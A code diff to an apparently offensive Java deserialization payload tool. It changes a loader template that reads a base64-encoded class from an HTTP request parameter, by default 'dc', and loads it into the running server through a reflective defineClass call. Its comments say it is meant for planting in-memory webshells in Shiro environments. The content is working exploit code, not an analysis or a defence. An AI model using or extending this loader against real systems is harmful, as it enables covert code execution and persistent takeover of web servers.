@@ -3,12 +3,14 @@ package org.su18.ysuserial.payloads.templates;
 
 /**
  * 在 shiro 等环境下，直接打内存马会出现 header 太长的问题，需要进行一个中转
- * 从 Parameter dc 中取字符进行 base64 decode，然后进行类加载，参考 ShiroAttack2
+ * 从 Parameter 默认为 "dc" 中取字符进行 base64 decode，然后进行类加载，参考 ShiroAttack2
  * 内存马 class 文件可以自行生成，base64 编码后由 request body 中的 dc 参数传递
  *
  * @author su18
  */
 public class DefineClassFromParameter {
+
+	public static String parameter;
 
 	static {
 		try {
@@ -54,7 +56,7 @@ public class DefineClassFromParameter {
 
 						Object req     = f.get(processor);
 						Object note    = req.getClass().getMethod("getNote", new Class[]{Integer.TYPE}).invoke(req, new Object[]{new Integer(1)});
-						String payload = (String) note.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(note, new Object[]{new String("dc")});
+						String payload = (String) note.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(note, new Object[]{parameter});
 						if (payload != null && !payload.isEmpty()) {
 							byte[]                   classBytes = base64Decode(payload);
 							java.lang.reflect.Method method     = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
